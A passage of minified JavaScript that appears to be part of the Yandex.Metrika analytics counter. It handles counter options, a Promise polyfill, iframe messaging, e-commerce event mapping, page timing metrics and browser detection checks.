          return Iu(wo(t, mo), [
            "ia_document.shareURL",
            "ia_document.referrer",
          ]);
        }),
        Tc = Io(function (t) {
          return !!(
            (t = mo(t, "navigator.plugins")) &&
            _u(t) &&
            Wu(po(Au("name"), bo(/Chrome PDF Viewer/)), t)
          );
        }),
        Sc = new RegExp(
          iu(
            "|",
            "yandex.com/bots;Googlebot;APIs-Google;Mediapartners-Google;AdsBot-Google;FeedFetcher-Google;Google-Read-Aloud;DuplexWeb-Google;Google Favicon;googleweblight;Mail.RU_Bot;StackRambler;Slurp;msnbot;bingbot;www.baidu.com/search/spi_?der.htm".split(
              ";"
            )
          ).replace(/[./]/g, "\\$&")
        ),
        Rc = Io(po(Au("navigator.userAgent"), bo(Sc))),
        Mc = Io(function (t) {
          var e = ic(t) || "",
            n = e.match(/Mac OS X ([0-9]+)_([0-9]+)/);
          return (
            (n = n ? [+n[1], +n[2]] : [0, 0]),
            14 <= ((e = e.match(/iPhone OS ([1-9]+)_([0-9]+)/)) ? +e[1] : 0) ||
              ((oc(t) || 10 < n[0] || (10 === n[0] && 13 <= n[1])) && sc(t))
          );
        }),
        Nc = eu.construct,
        Dc = bc(window),
        Pc = {
          Rg: 24226447,
          Mg: 26302566,
          Tg: 51533966,
          Zj: 65446441,
          Ka: "https:",
          Ja: "802",
          $b: Nc,
          Qg: Dc ? 512 : 2048,
          Og: Dc ? 512 : 2048,
          Pg: Dc ? 100 : 400,
          $j: 100,
          ak: "noindex",
        },
        Ic = {
          id: "id",
          Pe: "ut",
          aa: "type",
          Xd: "ldc",
          hb: "nck",
          qc: "url",
          Oh: "referrer",
        },
        Oc = /^\d+$/,
        Lc = {
          id: function (t) {
            (t = "" + (t || "0")), Oc.test(t) || (t = "0");
            try {
              var e = ec(t);
            } catch (t) {
              e = 0;
            }
            return e;
          },
          aa: function (t) {
            return "" + (t || 0 === t ? t : "0");
          },
          hb: Boolean,
          Pe: Boolean,
        };
      (Ic.ac = "defer"),
        (Lc.ac = Boolean),
        (Ic.Vj = "yaDisableGDPR"),
        (Ic.Wj = "yaGDPRLang"),
        (Ic.exp = "experiments"),
        (Ic.jc = "ecommerce"),
        (Lc.jc = function (t) {
          if (t) return !0 === t ? "dataLayer" : "" + t;
        }),
        (Ic.N = "params"),
        (Lc.N = function (t) {
          return Ao(t) || lo(t) ? t : null;
        }),
        (Ic.hd = "userParams"),
        (Ic.Wb = "accurateTrackBounce"),
        (Ic.Bg = "triggerEvent"),
        (Lc.Bg = Boolean),
        (Ic.lg = "sendTitle"),
        (Lc.lg = function (t) {
          return !!t || gu(t);
        }),
        (Ic.Le = "trackHash"),
        (Lc.Le = Boolean),
        (Ic.oh = "clickmap"),
        (Ic.Ta = "webvisor"),
        (Lc.Ta = Boolean),
        (Ic.Jj = "trustedDomains"),
        (Ic.wb = "childIframe"),
        (Lc.wb = Boolean),
        (Ic.ed = "trackLinks"),
        (Ic.xh = "enableAll"),
        (Ic.gf = "disableFomAnalytics"),
        (Lc.gf = Boolean);
      var jc = Cu(
          function (t, e) {
            var n = e[0];
            return (t[n] = { Vf: e[1], Oi: Lc[n] }), t;
          },
          {},
          Ru(Ic)
        ),
        Bc = {},
        Fc = Io(function (t) {
          return t.id + ":" + t.aa;
        }),
        Gc = ou("1"),
        Hc = Xo(function (t, e) {
          var n = e || {};
          return {
            b: wo(n, Ho),
            l: function (t, e) {
              var r = n[t];
              return gu(r) && !gu(e) ? e : r;
            },
            o: function (t, e) {
              return (n[t] = e), this;
            },
            De: function (t, e) {
              return "" === e || _o(e) ? this : this.o(t, e);
            },
            Da: wo(n, t),
          };
        }),
        Uc = Hc(function (t) {
          var e = "";
          return (
            (t = Cu(
              function (t, n) {
                var r = n[0],
                  i = r + ":" + n[1];
                return "t" === r ? (e = i) : t.push(i), t;
              },
              [],
              Ru(t)
            )),
            e && t.push(e),
            iu(":", t)
          );
        }),
        Xc = Pc.Ka + "//mc.yandex.ru/metrika/metrika_match.html",
        Vc = "hash host hostname href pathname port protocol search".split(" "),
        zc =
          "ru ua by kz az kg lv md tj tm uz ee fr lt com co.il com.ge com.am com.tr com.ua com.ru".split(
            " "
          ),
        Yc = /(?:^|\.)(?:(ya\.ru)|(?:yandex)\.(\w+|com?\.\w+))$/,
        qc = Io(function (t) {
          return (t = Xi(t).hostname.split("."))[t.length - 1];
        }),
        Kc = Io(function (t) {
          return (
            -1 !==
            Xi(t).hostname.search(
              /(?:^|\.)(?:ya|yandex|beru|kinopoisk|edadeal)\.(?:\w+|com?\.\w+)$/
            )
          );
        }),
        Wc = Io(function (t) {
          return (t ? t.replace(/^www\./, "") : "").toLowerCase();
        }),
        Jc =
          /^(.*\.)?((yandex(-team)?)\.(com?\.)?[a-z]+|(auto|kinopoisk|beru|bringly)\.ru|ya\.(ru|cc)|yadi\.sk|(^|\w+\.)yango\.com|yastatic\.net|meteum\.ai|.*\.yandex|turbopages\.org|turbo\.site)$/,
        $c = Io(function (t) {
          var e = !1;
          return (t = Xi(t).hostname) && (e = -1 !== t.search(Jc)), e;
        }),
        Zc =
          /^(.*\.)?((yandex(-team)?)\.(com?\.)?[a-z]+|(auto|kinopoisk|beru|bringly)\.ru|ya\.(ru|cc)|yadi\.sk|.*\.yandex|turbopages\.org|turbo\.site)$/,
        Qc = Io(function (t) {
          var e = !1;
          return (t = Xi(t).hostname) && (e = -1 !== t.search(Zc)), e;
        }),
        ts = Io(function (t) {
          var e = !1;
          return (t = Xi(t).hostname) && (e = -1 !== t.search(Yc)), e;
        }),
        es = po(Xi, Au("protocol"), ou("https:")),
        ns = Io(function (t) {
          return pc(t) && es(t) ? "SameSite=None;Secure;" : "";
        }),
        rs = Io(function (t) {
          var e = !1;
          if (!t.addEventListener) return e;
          try {
            var n = Object.defineProperty({}, "passive", {
              get: function () {
                return (e = !0), 1;
              },
            });
            t.addEventListener("test", qo, n);
          } catch (t) {}
          return e;
        }),
        is = Xo(function (t, e) {
          return t ? Nu({ capture: !0, passive: !0 }, e || {}) : !!e;
        }),
        os = Io(function (t) {
          t = rs(t);
          var e = is(t),
            n = {};
          return Nu(n, {
            C: function (t, r, i, o) {
              return (
                zu(function (n) {
                  var r = e(o);
                  Ui(t, n, i, r, !1);
                }, r),
                yu(n.Tb, n, t, r, i, o)
              );
            },
            Tb: function (t, n, r, i) {
              zu(function (n) {
                var o = e(i);
                Ui(t, n, r, o, !0);
              }, n);
            },
          });
        }),
        as = setTimeout;
      (ta.prototype.catch = function (t) {
        return this.then(null, t);
      }),
        (ta.prototype.then = function (t, e) {
          var n = new this.constructor(Qo);
          return ea(this, new oa(t, e, n)), n;
        }),
        (ta.prototype.finally = function (t) {
          var e = this.constructor;
          return this.then(
            function (n) {
              return e.resolve(t()).then(function () {
                return n;
              });
            },
            function (n) {
              return e.resolve(t()).then(function () {
                return e.reject(n);
              });
            }
          );
        }),
        (ta.all = function (t) {
          return new ta(function (e, n) {
            function r(t, a) {
              try {
                if (a && ("object" == typeof a || "function" == typeof a)) {
                  var u = a.then;
                  if ("function" == typeof u)
                    return void u.call(
                      a,
                      function (e) {
                        r(t, e);
                      },
                      n
                    );
                }
                (i[t] = a), 0 == --o && e(i);
              } catch (t) {
                n(t);
              }
            }
            if (!t || void 0 === t.length)
              return n(new TypeError("Promise.all accepts an array"));
            var i = Array.prototype.slice.call(t);
            if (0 === i.length) return e([]);
            for (var o = i.length, a = 0; a < i.length; a++) r(a, i[a]);
          });
        }),
        (ta.resolve = function (t) {
          return t && "object" == typeof t && t.constructor === ta
            ? t
            : new ta(function (e) {
                e(t);
              });
        }),
        (ta.reject = function (t) {
          return new ta(function (e, n) {
            n(t);
          });
        }),
        (ta.race = function (t) {
          return new ta(function (e, n) {
            if (!t || void 0 === t.length)
              return n(new TypeError("Promise.race accepts an array"));
            for (var r = 0, i = t.length; r < i; r++)
              ta.resolve(t[r]).then(e, n);
          });
        }),
        (ta.Ue =
          ("function" == typeof setImmediate &&
            function (t) {
              setImmediate(t);
            }) ||
          function (t) {
            as(t, 0);
          }),
        (ta.Vg = function (t) {
          "undefined" != typeof console &&
            console &&
            console.warn("Possible Unhandled Promise Rejection:", t);
        });
      var us = window.Promise,
        cs = Vo(us, "Promise"),
        ss = Vo(mo(us, "resolve"), "resolve"),
        fs = Vo(mo(us, "reject"), "reject"),
        hs = Vo(mo(us, "all"), "all");
      if (Fu(!1, [cs, ss, fs, hs])) us = ta;
      else {
        var ls = function (t) {
          return new Promise(t);
        };
        (ls.resolve = yu(ss, us)),
          (ls.reject = yu(fs, us)),
          (ls.all = yu(hs, us)),
          (us = ls);
      }
      var ds,
        ps,
        vs = [
          "http.0.st..rt.",
          "network error occurred",
          "send beacon",
          "Content Security Policy",
          "DOM Exception 18",
        ],
        ms =
          ((ps = window),
          function (t) {
            return ds
              ? new ds(t)
              : zo("Error", ps.Error)
              ? ((ds = ps.Error), new ps.Error(t))
              : new (ds = Hi)(t);
          }),
        gs = bo(/^http./),
        bs = bo(/^err.kn/),
        ys = /[^a-z0-9.:-]/,
        ws = Io(function (t) {
          return (
            "" + ((t = mo(t, "document") || {}).characterSet || t.charset || "")
          ).toLowerCase();
        }),
        Es = Io(po(Au("document"), wo("createElement", ao))),
        xs = Io(function (t) {
          var e = mo(t, "Element.prototype");
          return e &&
            (t = Bu(
              function (t) {
                return zo(t, e[t]);
              },
              [
                "matches",
                "webkitMatchesSelector",
                "mozMatchesSelector",
                "msMatchesSelector",
                "oMatchesSelector",
              ]
            ))
            ? e[t]
            : null;
        }),
        Cs = po(bi, ou("INPUT")),
        As = po(bi, ou("TEXTAREA")),
        _s = po(bi, ou("SELECT")),
        ks = po(Au("type"), bo(/^(checkbox|radio)$/)),
        Ts = po(bi, bo(/^INPUT|SELECT|TEXTAREA$/)),
        Ss = po(bi, bo(/^INPUT|SELECT|TEXTAREA|BUTTON$/)),
        Rs = "INPUT CHECKBOX RADIO TEXTAREA SELECT PROGRESS".split(" "),
        Ms = ["submit", "image", "hidden"],
        Ns =
          "A B BIG BODY BUTTON DD DIV DL DT EM FIELDSET FORM H1 H2 H3 H4 H5 H6 HR I IMG INPUT LI OL P PRE SELECT SMALL SPAN STRONG SUB SUP TABLE TBODY TD TEXTAREA TFOOT TH THEAD TR U UL ABBR AREA BLOCKQUOTE CAPTION CENTER CITE CODE CANVAS DFN EMBED FONT INS KBD LEGEND LABEL MAP OBJECT Q S SAMP STRIKE TT ARTICLE AUDIO ASIDE FOOTER HEADER MENU METER NAV PROGRESS SECTION TIME VIDEO NOINDEX NOBR MAIN svg circle clippath ellipse defs foreignobject g glyph glyphref image line lineargradient marker mask path pattern polygon polyline radialgradient rect set text textpath title".split(
            " "
          ),
        Ds = Io(function () {
          for (var t = 59, e = {}, n = 0; n < Ns.length; n += 1)
            (e[Ns[n]] = String.fromCharCode(t)), (t += 1);
          return e;
        }),
        Ps = Io(function (t) {
          return { pk: t, ab: null, kb: [] };
        }),
        Is = {},
        Os = {};
      Is.p = 500;
      var Ls = { i: "id", n: "name", h: "href", ty: "type" };
      (Os.h = !0), (Os.c = !0);
      var js = {};
      (js.p = fi),
        (js.c = function (t, e, n) {
          return (
            (t = So(mo(e, "textContent"))) &&
              n &&
              (n = n(e)).length &&
              Wu(po(Au("textContent"), So, ou(t)), n) &&
              (t = ""),
            Cs(e) && (t = So((e.getAttribute && e.getAttribute("value")) || t)),
            t
          );
        });
      var Bs,
        Fs,
        Gs =
          "button," +
          Vu(
            function (t) {
              return 'input[type="' + t + '"]';
            },
            ["button", "submit", "reset", "file"]
          ).join(",") +
          ",a",
        Hs = wo(Gs, ci),
        Us =
          (((Bs = {}).A = "h"),
          (Bs.BUTTON = "i"),
          (Bs.DIV = "i"),
          (Bs.INPUT = "ty"),
          Bs),
        Xs = [Kr, 0, Ni, Wr, ti],
        Vs = [Ni];
      Vs.push(Wr);
      var zs = qr(Vs),
        Ys = qr([ti]),
        qs = qr([Kr, ti]),
        Ks = qr([0, Ni, Wr, ti]),
        Ws = (((Fs = {}).h = zs), (Fs.f = zs), (Fs.er = Ys), Fs);
      (Ws.d = Ys),
        (Ws.s = qr([Ni])),
        (Ws.S = Ws.s),
        (Ws.u = Ys),
        (Ws.pi = Ys),
        (Ws.m = qs),
        (Ws[2] = Xs),
        (Ws[6] = qr([0, Ni])),
        (Ws.t = Xs),
        (Ws.a = Ks),
        (Ws.n = Xs),
        (Ws.p = qr([0, Ni])),
        (Ws[4] = qr([0, Ni, ti])),
        (Ws.r = Ks),
        (Ws[1] = Ks),
        (Ws.g = Ks),
        (Ws.c = Ys),
        (Ws.e = Xs),
        (Ws.adb = Ys),
        (Ws.W = qr([0, Ni])),
        (Ws[5] = Xs),
        (Ws[8] = [Jr]);
      var Js,
        $s,
        Zs,
        Qs = Io(function (t, e) {
          var n;
          return (
            (n = e ? Ws[e] : Xs) || (n = []),
            (n = Cu(
              function (e, n, r) {
                return (n = n && n(t)) && e.push([r, n]), e;
              },
              [],
              n
            )).length || Fi(),
            n
          );
        }, Go),
        tf = ["0", "1", "2", "3"],
        ef = tf[0],
        nf = tf[1],
        rf = tf[2],
        of = Vu(po(Ho, yo("concat", "GDPR-ok-view-detailed-")), tf),
        af = $o(
          "GDPR-ok GDPR-cross GDPR-cancel 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 GDPR-settings GDPR-ok-view-default GDPR-ok-view-detailed 21 22 23".split(
            " "
          ),
          of,
          ["28", "29", "30"]
        ),
        uf = "3 13 14 15 16 17 28".split(" "),
        cf = po(qu(Au("ymetrikaEvent.type")), ju(Gu(af))),
        sf = uo("gsc", Sr),
        ff = /:\d+$/,
        hf = Io(function (t) {
          var e = (Xi(t).host || "").split(".");
          return 1 === e.length
            ? e[0]
            : Cu(
                function (n, r, i) {
                  return (
                    2 <= (i += 1) &&
                      !n &&
                      ((i = iu(".", e.slice(-i))), _r(t, i) && (n = i)),
                    n
                  );
                },
                "",
                e
              );
        }),
        lf = Io(sa),
        df = Io(function (t) {
          Er(t, "_ymBRC", "1");
          var e = "1" !== xr(t, "_ymBRC");
          return e || Cr(t, "_ymBRC"), e;
        }),
        pf = Io(wr),
        vf = Io(wr, function (t, e, n) {
          return "" + e + n;
        }),
        mf = Io(br),
        gf = uo("r", function (t, e) {
          var n = lr(t, e),
            r = n[0];
          return !n[1] && r;
        }),
        bf = Io(hr, function (t, e) {
          return "{" + e.Xd + e.hb;
        }),
        yf = Io(oo, Fc),
        wf = po(bf, Zo),
        Ef = Xo(function (t, e) {
          for (var n = []; !cr(e); ) {
            var r = ir(e);
            t(r, function (t) {
              return t(e);
            }),
              n.push(r);
          }
          return n;
        }),
        xf = Xo(function (t, e) {
          return cu(function (n, r) {
            return e(n, function (e) {
              try {
                r(t(e));
              } catch (t) {
                n(t);
              }
            });
          });
        }),
        Cf = Xo(function (t, e) {
          return cu(function (n, r) {
            return e(n, function (e) {
              try {
                t(e)(Zn(n, r));
              } catch (t) {
                n(t);
              }
            });
          });
        }),
        Af = [],
        _f = !1,
        kf = !1,
        Tf = Io(function (t) {
          if ((t = Es(t))) return t("a");
        }),
        Sf = ["webkitvisibilitychange", "visibilitychange"],
        Rf = Hc(function (t) {
          return (
            (t = Ru(t)),
            iu(
              "",
              Vu(function (t) {
                var e = t[0];
                return (t = t[1]), mu(t) ? "" : e + "(" + t + ")";
              }, t)
            )
          );
        }),
        Mf = Eo([1, null], Qi),
        Nf = Eo([1, 0], Qi),
        Df = /^ *(data|javascript):/i,
        Pf = new RegExp(
          iu("", [
            "\\.(" +
              iu(
                "|",
                "3gp 7z aac ac3 acs ai avi ape apk asf bmp bz2 cab cdr crc32 css csv cue divx dmg djvu? doc(x|m|b)? emf eps exe flac? flv iso swf gif t?gz jpe?g? js m3u8? m4a mp(3|4|e?g?) m4v md5 mkv mov msi ods og(g|m|v) psd rar rss rtf sea sfv sit sha1 svg tar tif?f torrent ts txt vob wave? wma wmv wmf webm ppt(x|m|b)? xls(x|m|b)? pdf phps png xpi g?zip".split(
                  " "
                )
              ) +
              ")$",
          ]),
          "i"
        ),
        If =
          (((Js = {}).hit = "h"),
          (Js.experiments = "ex"),
          (Js.params = "p"),
          (Js.reachGoal = "g"),
          (Js.userParams = "up"),
          (Js.trackHash = "th"),
          (Js.accurateTrackBounce = "atb"),
          (Js.notBounce = "nb"),
          (Js.addFileExtension = "fe"),
          (Js.extLink = "el"),
          (Js.file = "fc"),
          (Js.trackLinks = "tl"),
          (Js.destruct = "d"),
          (Js.setUserID = "ui"),
          (Js.getClientID = "ci"),
          (Js.clickmap = "cm"),
          (Js.enableAll = "ea"),
          Js),
        Of = bo(/^.+\.mtproxy\.yandex\.net$/),
        Lf = Io(function (t) {
          return "MetrikaPlayer" === t.name || ((t = Xi(t).hostname), Of(t));
        }),
        jf = Io(function () {
          return { Lb: {}, pending: {}, xb: {} };
        }),
        Bf = Au("postMessage"),
        Ff = Hr("s.f", function (t, e, n, r, i) {
          e = e(r);
          var o = jf(t),
            a = iu(":", [e.Y.hc, e.Y.key]);
          if (Bf(n)) {
            o.pending[a] = i;
            try {
              n.postMessage(e.ug, "*");
            } catch (t) {
              return void delete o.pending[a];
            }
            Br(
              t,
              function () {
                delete o.pending[a];
              },
              5e3,
              "if.s"
            );
          }
        }),
        Gf = Hr("s.fh", function (t, e, n, r, i, o) {
          var a = null,
            u = null,
            c = jf(t),
            s = null;
          try {
            (u = (a = ua(t, o.data)).__yminfo), (s = a.data);
          } catch (t) {
            return;
          }
          if (
            !_o(u) &&
            u.substring &&
            "__yminfo" === u.substring(0, 8) &&
            !_o(s) &&
            4 === (a = u.split(":")).length
          )
            if (
              ((u = e.id),
              (e = a[1]),
              (t = a[2]),
              (a = a[3]),
              !lo(s) && s.type && "0" === a && s.counterId)
            ) {
              if (!s.toCounter || s.toCounter == u) {
                c = null;
                try {
                  c = o.source;
                } catch (t) {}
                !mu(c) &&
                  Bf(c) &&
                  ((o = r.O(s.type, [o, s])),
                  (i = Vu(po(Ho, Du(i)), o.concat([{}]))),
                  (s = n([e, t, s.counterId], i)),
                  c.postMessage(s.ug, "*"));
              }
            } else
              a === "" + u &&
                lo(s) &&
                Lu(function (t) {
                  return !(!t.hid || !t.counterId);
                }, s).length === s.length &&
                (n = c.pending[iu(":", [e, t])]) &&
                n.apply(null, [o].concat(s));
        }),
        Hf = Io(function (t, e) {
          var n,
            r = ao("getElementsByTagName", mo(t, "document")),
            i = jf(t),
            o = Bf(t),
            a = Fr(t),
            u = os(t);
          if (!r || !o) return null;
          (r = r.call(t.document, "iframe")),
            ((n = {}).counterId = e.id),
            (n.hid = "" + Fn(t)),
            (o = n),
            (function (t, e) {
              var n = jf(t);
              e.C(["initToParent"], function (t) {
                var e = t[1];
                n.xb[e.counterId] = { info: e, window: t[0].source };
              })
                .C(["initToChild"], function (n) {
                  var r = n[0];
                  (n = n[1]),
                    r.source === t.parent && e.O("parentConnect", [r, n]);
                })
                .C(["parentConnect"], function (t) {
                  var e = t[1];
                  e.counterId &&
                    (n.Lb[e.counterId] = { info: e, window: t[0].source });
                });
            })(t, a),
            (n = (function (t, e) {
              return function (n, r) {
                var i,
                  o = { hc: mf(t)(gr), key: t.Math.random(), dir: 0 };
                n.length &&
                  ((o.hc = ec(n[0])),
                  (o.key = parseFloat(n[1])),
                  (o.dir = ec(n[2]))),
                  Nu(r, e);
                var a =
                  (((i = { data: r }).__yminfo = iu(":", [
                    "__yminfo",
                    o.hc,
                    o.key,
                    o.dir,
                  ])),
                  i);
                return { Y: o, ug: Oi(t, a) || "" };
              };
            })(t, o));
          var c = Eo([t, wo([], n)], Ff);
          return (
            zu(function (t) {
              var e = null;
              try {
                e = t.contentWindow;
              } catch (t) {}
              e &&
                c(e, { type: "initToChild" }, function (t, e) {
                  a.O("initToParent", [t, e]);
                });
            }, r),
            Ec(t) &&
              c(t.parent, { type: "initToParent" }, function (t, e) {
                a.O("parentConnect", [t, e]);
              }),
            u.C(t, ["message"], Eo([t, e, n, a, o], Gf)),
            { Z: a, Lb: i.Lb, xb: i.xb, ze: c }
          );
        }, po(Go, Fc)),
        Uf = Io(Ln, po(Go, Fc)),
        Xf = Hr("pa.plgn", function (t, e) {
          var n = Uf(t, e);
          n &&
            n.Z.C(
              ["pluginInfo"],
              Ur(t, "c.plgn", function () {
                var n = Pu(t);
                return (
                  n.o("cmc", n.l("cmc", 0) + 1),
                  (function (t, e) {
                    return Cu(
                      function (t, n) {
                        return (t[e[n[0]].Vf] = n[1]), t;
                      },
                      {},
                      Ru(t)
                    );
                  })(e, jc)
                );
              })
            );
        }),
        Vf =
          ((($s = {}).transaction_id = "id"),
          ($s.item_id = "id"),
          ($s.item_name = "name"),
          ($s.item_brand = "brand"),
          ($s.promotion_name = "coupon"),
          ($s.index = "position"),
          ($s.item_variant = "variant"),
          ($s.value = "revenue"),
          ($s.item_category = "category"),
          $s),
        zf =
          (((Zs = {}).view_item = "detail"),
          (Zs.add_to_cart = "add"),
          (Zs.remove_from_cart = "remove"),
          (Zs.begin_checkout = "checkout"),
          (Zs.purchase = "purchase"),
          Zs),
        Yf = "currencyCode add delete remove purchase checkout detail".split(
          " "
        ),
        qf = Xo(function (t, e) {
          return Pu(e).l(t, null);
        }),
        Kf = Io(function () {
          var t = 0;
          return function () {
            return (t += 1);
          };
        }),
        Wf = po(Fc, Kf, Wo),
        Jf = {
          mc: function (t) {
            return (
              (t = co(t).l("mt", {})),
              (t = Ru(t)).length
                ? Cu(
                    function (t, e, n) {
                      return t + (n ? "-" : "") + e[0] + "-" + e[1];
                    },
                    "",
                    t
                  )
                : null
            );
          },
        };
      (Jf.oo = qf("oo")),
        (Jf.pmc = qf("cmc")),
        (Jf.clc = qf("cls")),
        (Jf.lt = function (t) {
          var e = co(t).l("lt", null);
          return e ? t.Math.round(100 * e) : e;
        }),
        (Jf.re = po(function (t, e) {
          return !e.hb && gf(t, e);
        }, Mf)),
        (Jf.aw = function (t) {
          return _o(
            (t = Bu(po(_o, Fo), [
              t.document.hidden,
              t.document.msHidden,
              t.document.webkitHidden,
            ]))
          )
            ? null
            : Nf(!t);
        }),
        (Jf.ifc = function (t) {
          return co(t).l("ifc");
        }),
        (Jf.ifb = function (t) {
          return co(t).l("ifb");
        }),
        (Jf.rqnt = function (t, e, n) {
          return !(t = n.F) || t.nohit ? null : Wf(e);
        }),
        (Jf.ecs = function (t) {
          return co(t).l("ecs");
        });
      var $f,
        Zf,
        Qf,
        th = Mu(Jf),
        eh = Io(function () {
          return { pf: null, zc: [] };
        }, Fc),
        nh = [
          ["domainLookupEnd", "domainLookupStart"],
          ["connectEnd", "connectStart"],
          ["responseStart", "requestStart"],
          ["responseEnd", "responseStart"],
          ["fetchStart", "navigationStart"],
          ["redirectEnd", "redirectStart"],
          [
            function (t, e) {
              return (
                mo(e, "redirectCount") || mo(t, "navigation.redirectCount")
              );
            },
          ],
          ["domInteractive", "domLoading"],
          ["domContentLoadedEventEnd", "domContentLoadedEventStart"],
          ["domComplete", "navigationStart"],
          ["loadEventStart", "navigationStart"],
          ["loadEventEnd", "loadEventStart"],
          ["domContentLoadedEventStart", "navigationStart"],
        ],
        rh = [
          ["domainLookupEnd", "domainLookupStart"],
          ["connectEnd", "connectStart"],
          ["responseStart", "requestStart"],
          ["responseEnd", "responseStart"],
          ["fetchStart"],
          ["redirectEnd", "redirectStart"],
          ["redirectCount"],
          ["domInteractive", "responseEnd"],
          ["domContentLoadedEventEnd", "domContentLoadedEventStart"],
          ["domComplete"],
          ["loadEventStart"],
          ["loadEventEnd", "loadEventStart"],
          ["domContentLoadedEventStart"],
        ],
        ih =
          ((($f = {}).responseEnd = 1),
          ($f.domInteractive = 1),
          ($f.domContentLoadedEventStart = 1),
          ($f.domContentLoadedEventEnd = 1),
          ($f.domComplete = 1),
          ($f.loadEventStart = 1),
          ($f.loadEventEnd = 1),
          ($f.unloadEventStart = 1),
          ($f.unloadEventEnd = 1),
          ($f.secureConnectionStart = 1),
          $f),
        oh = Io(io),
        ah = { "*": "+", "-": "/", dk: "=", "+": "*", "/": "-", "=": "_" },
        uh = Io(function (t) {
          t = mo(t, "console");
          var e = mo(t, "log");
          e = Yo("log", e) ? yu(e, t) : qo;
          var n = mo(t, "warn");
          n = Yo("warn", n) ? yu(n, t) : e;
          var r = mo(t, "error");
          return {
            log: e,
            error: (t = Yo("error", r) ? yu(r, t) : e),
            warn: n,
          };
        }),
        ch = Hr("p.cd", function (t, e) {
          if (vc(t) || oc(t)) {
            var n = pf(t);
            if (_o(n.l("jn"))) {
              n.o("jn", !1);
              var r = t.ik || sc(t) ? function () {} : /./,
                i = uh(t, Fc(e));
              (r.toString = function () {
                return n.o("jn", !0), "Yandex.Metrika counter is initialized";
              }),
                i.log("%c%s", "color: inherit", r);
            }
          }
        }),
        sh = /Firefox\/([0-9]+)/,
        fh = /([0-9\\.]+) Safari/,
        hh = /\sYptp\/\d\.(\d+)\s/,
        lh = /Edg\/(\d+)\./,
        dh = Io(function (t) {
          var e;
          return (
            !(
              (50 <=
                (e =
                  (e = ic(t)) && (e = hh.exec(e)) && 1 < e.length
                    ? ec(e[1])
                    : 0) &&
                99 >= e) ||
              Nn(t, 79)
            ) &&
            (!Mc(t) || cc(t))
          );
        }),
        ph =
          "monospace;sans-serif;serif;Andale Mono;Arial;Arial Black;Arial Hebrew;Arial MT;Arial Narrow;Arial Rounded MT Bold;Arial Unicode MS;Bitstream Vera Sans Mono;Book Antiqua;Bookman Old Style;Calibri;Cambria;Cambria Math;Century;Century Gothic;Century Schoolbook;Comic Sans;Comic Sans MS;Consolas;Courier;Courier New;Garamond;Geneva;Georgia;Helvetica;Helvetica Neue;Impact;Lucida Bright;Lucida Calligraphy;Lucida Console;Lucida Fax;LUCIDA GRANDE;Lucida Handwriting;Lucida Sans;Lucida Sans Typewriter;Lucida Sans Unicode;Microsoft Sans Serif;Monaco;Monotype Corsiva;MS Gothic;MS Outlook;MS PGothic;MS Reference Sans Serif;MS Sans Serif;MS Serif;MYRIAD;MYRIAD PRO;Palatino;Palatino Linotype;Segoe Print;Segoe Script;Segoe UI;Segoe UI Light;Segoe UI Semibold;Segoe UI Symbol;Tahoma;Times;Times New Roman;Times New Roman PS;Trebuchet MS;Verdana;Wingdings;Wingdings 2;Wingdings 3".split(
            ";"
          ),
        vh = Io(function (t) {
          var e = mo((t = Es(t)("canvas")), "getContext");
          if (!e) return null;
          try {
            var n = yu(e, t)("2d");
            n.font = "72px mmmmmmmmmmlli";
            var r = n.measureText("mmmmmmmmmmlli").width;
            return function (t) {
              return (
                (n.font = "72px " + t),
                n.measureText("mmmmmmmmmmlli").width === r
              );
            };
          } catch (t) {
            return null;
          }
        }),
        mh = Vo(String.prototype.repeat, "repeat"),
        gh = mh
          ? function (t, e) {
              return mh.call(t, e);
            }
          : function (t, e) {
              for (var n = "", r = 0; r < e; r += 1) n += t;
              return n;
            },
        bh = wo(!0, function (t, e, n, r) {
          return 0 >= (n = e.length && (n - r.length) / e.length)
            ? r
            : ((e = gh(e, n)), t ? e + r : r + e);
        }),
        yh = [2277735313, 289559509],
        wh = [1291169091, 658871167],
        Eh = /\/$/,
        xh = Io(
          po(
            mf,
            cu(function (t) {
              return -new t.b.Date().getTimezoneOffset();
            })
          )
        ),
        Ch = po(
          mf,
          cu(function (t) {
            return (
              (t = new t.b.Date()),
              iu(
                "",
                Vu(yr, [
                  t.getFullYear(),
                  t.getMonth() + 1,
                  t.getDate(),
                  t.getHours(),
                  t.getMinutes(),
                  t.getSeconds(),
                ])
              )
            );
          })
        ),
        Ah = po(mf, cu(vr)),
        _h = Io(
          po(
            mf,
            cu(function (t) {
              return t.ra[0];
            })
          )
        ),
        kh = Io(oo),
        Th = Io(oo),
        Sh = Io(function (t) {
          var e = mo(t, "webkitRequestFileSystem");
          if (ko(e) && !vc(t))
            return new us(yu(e, t, 0, 0))
              .then(function () {
                var e = mo(t, "navigator.storage") || {};
                return e.estimate ? e.estimate() : {};
              })
              .then(function (t) {
                return !!((t = t.quota) && 12e7 > t);
              })
              .catch(wo(!0, Ho));
          if (Uu(t))
            return (e = mo(t, "navigator.serviceWorker")), us.resolve(gu(e));
          if (((e = mo(t, "openDatabase")), sc(t) && ko(e))) {
            var n = !1;
            try {
              e(null, null, null, null);
            } catch (t) {
              n = !0;
            }
            return us.resolve(n);
          }
          return us.resolve(
            !mo(t, "indexedDB") &&
              (mo(t, "PointerEvent") || mo(t, "MSPointerEvent"))
          );
        }),
        Rh = /(\?|&)turbo_uid=([\w\d]+)($|&)/,
        Mh = Io(function (t, e) {
          var n = lf(t),
            r = Xi(t).search.match(Rh);
          return r && 2 <= r.length
            ? ((r = r[2]), e.hb || n.o("turbo_uid", r), r)
            : (n = n.l("turbo_uid"))
            ? n
            : "";
        }),
        Nh = Io(function (t) {
          return ko(mo(t, "yandex.getSiteUid")) ? t.yandex.getSiteUid() : null;
        }),
        Dh = Io(function (t) {
          var e = (t = Pu(t)).l("counterNum", 0) + 1;
          return t.o("counterNum", e), e;
        }, po(Go, Fc)),
        Ph =
          (((Zf = {}).vf = wo(eu.version, Ho)),
          (Zf.nt = gc),
          (Zf.fp = function (t, e, n) {
            if (n.F && n.F.nohit) return null;
            if (((e = Fc(e)), (n = kh(t))[e])) return null;
            t: {
              var r = _h(t),
                i = mo(t, "performance.getEntriesByType");
              if (ko(i)) {
                if (
                  (t = Lu(
                    po(Ho, Au("name"), ou("first-contentful-paint")),
                    i.call(t.performance, "paint")
                  )).length
                ) {
                  t = t[0].startTime;
                  break t;
                }
              } else {
                if (
                  ko((i = mo(t, "chrome.loadTimes"))) &&
                  ((i = mo((i = i.call(t.chrome)), "firstPaintTime")), r && i)
                ) {
                  t = 1e3 * i - r;
                  break t;
                }
